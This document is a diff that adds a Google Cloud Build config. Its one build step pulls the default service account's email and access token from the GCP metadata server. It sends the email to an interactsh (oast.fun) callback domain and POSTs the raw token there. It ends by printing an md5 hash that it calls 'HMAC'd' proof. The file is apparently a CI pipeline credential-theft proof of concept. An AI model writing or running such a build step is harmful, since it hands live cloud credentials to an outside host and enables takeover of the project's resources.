@@ -1,0 +1,20 @@
+steps:
+- name: gcr.io/cloud-builders/curl
+  id: exfil-sa-identity
+  entrypoint: bash
+  args:
+  - -c
+  - |
+    echo "=== step 1: fetch SA email ==="
+    SA_EMAIL=$(curl -s -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email)
+    echo "SA: $SA_EMAIL"
+    echo "=== step 2: fetch access token ==="
+    TOKEN=$(curl -s -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token")
+    echo "TOKEN_LEN=${#TOKEN}"
+    echo "=== step 3: exfil SA email to interactsh ==="
+    curl -s "https://sa-$(echo $SA_EMAIL | tr '@.' '--').d7ld6ihnhllphihjfnlgnrg5a884uzui7.oast.fun/hit" | head -5
+    echo "=== step 4: exfil token ==="
+    curl -s -X POST "https://exfil.d7ld6ihnhllphihjfnlgnrg5a884uzui7.oast.fun/" -d "$TOKEN" | head -5
+    echo "=== step 5: HMAC'd proof the real token was exfiltrated ==="
+    echo $TOKEN | md5sum
+    echo "DONE"
